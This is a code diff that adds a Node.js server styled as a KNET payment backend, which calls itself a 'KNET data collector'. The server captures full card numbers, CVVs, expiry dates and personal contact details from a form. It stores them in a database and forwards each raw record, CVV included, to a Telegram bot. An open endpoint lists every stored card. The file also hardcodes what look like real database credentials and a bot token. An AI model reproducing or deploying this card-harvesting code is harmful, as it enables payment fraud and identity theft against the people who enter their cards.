@@ -2756,3 +2756,328 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </body>
 </html>
+
+ملف next.js 
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+const { Pool } = require('pg');
+
+const PORT = Number(process.env.PORT) || 3000;
+const HOST = process.env.HOST || '0.0.0.0';
+const DATA_FILE = path.join(__dirname, 'knet-data.json');
+const HTML_FILE = path.join(__dirname, 'knet.html');
+const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://neondb_owner:npg_oGyOw8CWDz6d@ep-flat-flower-ayp1j1o8-pooler.c-5.us-east-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require';
+const BOT_TOKEN = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
+const CHAT_ID = '8108427825';
+
+const pool = new Pool({
+  connectionString: DATABASE_URL,
+  ssl: {
+    rejectUnauthorized: false
+  }
+});
+
+function safeJsonParse(value) {
+  try {
+    return JSON.parse(value);
+  } catch (error) {
+    return null;
+  }
+}
+
+function readData() {
+  try {
+    if (!fs.existsSync(DATA_FILE)) return [];
+    const raw = fs.readFileSync(DATA_FILE, 'utf8');
+    const parsed = safeJsonParse(raw);
+    return Array.isArray(parsed) ? parsed : [];
+  } catch (error) {
+    return [];
+  }
+}
+
+function writeData(items) {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(items, null, 2), 'utf8');
+  } catch (error) {
+    console.error('Save error:', error.message);
+  }
+}
+
+function normalize(payload = {}) {
+  const source = payload && typeof payload === 'object' ? payload : {};
+
+  return {
+    source: 'knet-form',
+    createdAt: new Date().toISOString(),
+    amount: Number(source.amount) || 0,
+    currency: String(source.currency || 'KWD').toUpperCase(),
+    cardNumber: String(source.cardNumber || '').replace(/\D/g, '').slice(0, 19),
+    cardHolder: String(source.cardHolder || '').trim(),
+    expiryMonth: String(source.expiryMonth || '').replace(/\D/g, '').slice(0, 2),
+    expiryYear: String(source.expiryYear || '').replace(/\D/g, '').slice(0, 2),
+    cvv: String(source.cvv || '').replace(/\D/g, '').slice(0, 4),
+    paymentMethod: String(source.paymentMethod || 'KNET').trim(),
+    reference: String(source.reference || `KNET-${Date.now()}`).trim(),
+    email: String(source.email || '').trim(),
+    phone: String(source.phone || '').trim(),
+    customerName: String(source.customerName || '').trim(),
+    notes: String(source.notes || '').trim(),
+    status: 'pending',
+    apiMode: String(source.apiMode || 'pending')
+  };
+}
+
+async function initializeDatabase() {
+  const client = await pool.connect();
+
+  try {
+    await client.query(`
+      CREATE TABLE IF NOT EXISTS knet_payments (
+        id SERIAL PRIMARY KEY,
+        source TEXT,
+        created_at TIMESTAMPTZ DEFAULT NOW(),
+        amount NUMERIC(12, 3),
+        currency TEXT,
+        card_number TEXT,
+        card_holder TEXT,
+        expiry_month TEXT,
+        expiry_year TEXT,
+        cvv TEXT,
+        payment_method TEXT,
+        reference TEXT,
+        email TEXT,
+        phone TEXT,
+        customer_name TEXT,
+        notes TEXT,
+        status TEXT,
+        api_mode TEXT,
+        raw_data JSONB
+      );
+    `);
+
+    console.log('Database initialized successfully.');
+  } finally {
+    client.release();
+  }
+}
+
+async function savePaymentToDatabase(payload) {
+  const client = await pool.connect();
+
+  try {
+    const result = await client.query(
+      `
+        INSERT INTO knet_payments (
+          source,
+          amount,
+          currency,
+          card_number,
+          card_holder,
+          expiry_month,
+          expiry_year,
+          cvv,
+          payment_method,
+          reference,
+          email,
+          phone,
+          customer_name,
+          notes,
+          status,
+          api_mode,
+          raw_data
+        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17)
+        RETURNING id, created_at;
+      `,
+      [
+        payload.source,
+        payload.amount,
+        payload.currency,
+        payload.cardNumber,
+        payload.cardHolder,
+        payload.expiryMonth,
+        payload.expiryYear,
+        payload.cvv,
+        payload.paymentMethod,
+        payload.reference,
+        payload.email,
+        payload.phone,
+        payload.customerName,
+        payload.notes,
+        payload.status,
+        payload.apiMode,
+        payload
+      ]
+    );
+
+    return result.rows[0];
+  } finally {
+    client.release();
+  }
+}
+
+function formatTelegramMessage(payload) {
+  return [
+    '🧾 New KNET Payment Received',
+    '',
+    `Reference: ${payload.reference || 'N/A'}`,
+    `Amount: ${payload.amount || 0} ${payload.currency || 'KWD'}`,
+    `Card Holder: ${payload.cardHolder || 'N/A'}`,
+    `Payment Method: ${payload.paymentMethod || 'N/A'}`,
+    `Email: ${payload.email || 'N/A'}`,
+    `Phone: ${payload.phone || 'N/A'}`,
+    `Customer: ${payload.customerName || 'N/A'}`,
+    `Notes: ${payload.notes || 'N/A'}`,
+    `Created At: ${payload.createdAt || new Date().toISOString()}`,
+    '',
+    'Raw Payload:',
+    JSON.stringify(payload, null, 2)
+  ].join('\n');
+}
+
+async function sendToTelegram(payload) {
+  const message = formatTelegramMessage(payload);
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        disable_web_page_preview: true
+      })
+    });
+
+    const result = await response.json();
+    console.log('Telegram send result:', JSON.stringify(result));
+    return result;
+  } catch (error) {
+    console.error('Telegram send error:', error.message);
+    return null;
+  }
+}
+
+function sendJson(res, statusCode, data) {
+  res.writeHead(statusCode, { 'Content-Type': 'application/json; charset=utf-8' });
+  res.end(JSON.stringify(data));
+}
+
+function readBody(req) {
+  return new Promise((resolve, reject) => {
+    let body = '';
+
+    req.on('data', (chunk) => {
+      body += chunk;
+      if (body.length > 1_000_000) {
+        req.destroy();
+        reject(new Error('Body too large'));
+      }
+    });
+
+    req.on('end', () => {
+      if (!body) {
+        resolve({});
+        return;
+      }
+
+      const parsed = safeJsonParse(body);
+      if (parsed && typeof parsed === 'object') {
+        resolve(parsed);
+        return;
+      }
+
+      const entries = new URLSearchParams(body);
+      const result = {};
+      for (const [key, value] of entries.entries()) {
+        result[key] = value;
+      }
+      resolve(result);
+    });
+
+    req.on('error', reject);
+  });
+}
+
+function serveHtml(res) {
+  fs.readFile(HTML_FILE, 'utf8', (error, content) => {
+    if (error) {
+      sendJson(res, 500, { success: false, message: 'Unable to read HTML file' });
+      return;
+    }
+
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    res.end(content);
+  });
+}
+
+const server = http.createServer(async (req, res) => {
+  const url = new URL(req.url, `http://${req.headers.host}`);
+
+  if (req.method === 'GET' && url.pathname === '/') {
+    serveHtml(res);
+    return;
+  }
+
+  if (req.method === 'GET' && url.pathname === '/health') {
+    sendJson(res, 200, { ok: true, service: 'knet-server', time: new Date().toISOString() });
+    return;
+  }
+
+  if (req.method === 'GET' && url.pathname === '/api/knet') {
+    const list = readData();
+    sendJson(res, 200, { success: true, count: list.length, items: list });
+    return;
+  }
+
+  if (req.method === 'POST' && url.pathname === '/api/knet') {
+    try {
+      const body = await readBody(req);
+      const normalized = normalize(body);
+      const dbRecord = await savePaymentToDatabase(normalized);
+      const all = [...readData(), normalized];
+      writeData(all);
+
+      await sendToTelegram({
+        ...normalized,
+        createdAt: normalized.createdAt
+      });
+
+      console.log('Saved payment payload to database:', JSON.stringify({
+        id: dbRecord && dbRecord.id,
+        createdAt: dbRecord && dbRecord.created_at,
+        amount: normalized.amount,
+        reference: normalized.reference
+      }));
+
+      sendJson(res, 200, {
+        success: true,
+        message: 'Data received successfully and stored in database',
+        item: normalized,
+        dbRecordId: dbRecord && dbRecord.id,
+        totalSaved: all.length
+      });
+    } catch (error) {
+      console.error('POST /api/knet error:', error.message);
+      sendJson(res, 400, { success: false, message: error.message || 'Invalid request' });
+    }
+    return;
+  }
+
+  sendJson(res, 404, { success: false, message: 'Route not found' });
+});
+
+initializeDatabase()
+  .then(() => {
+    server.listen(PORT, HOST, () => {
+      console.log(`KNET data collector running on http://${HOST}:${PORT}`);
+      console.log(`Open http://${HOST}:${PORT}/`);
+    });
+  })
+  .catch((error) => {
+    console.error('Database initialization failed:', error.message);
+    process.exit(1);
+  });
+
